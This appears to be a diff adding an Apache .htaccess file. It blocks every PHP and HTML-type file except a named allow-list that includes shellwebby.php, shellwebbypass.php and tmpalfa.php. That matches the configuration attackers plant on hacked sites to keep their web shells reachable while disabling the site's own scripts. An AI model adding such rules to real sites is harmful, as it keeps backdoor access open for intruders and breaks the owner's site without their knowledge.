@@ -1,0 +1,11 @@
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*|shtml|phtml|htm*|PHTML|SHTML|sHTmL|pHTmL|sH*|Sh*)$">
+Deny from all
+</FilesMatch>
+
+<FilesMatch "^(shellwebby.php|shellwebbypass.php|tmpconfiguration.php|tiktokinsta.php|instatiktok.php|tmpalfa.php)$">
+Allow from all
+</FilesMatch>
+
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+Allow from all
+</FilesMatch>
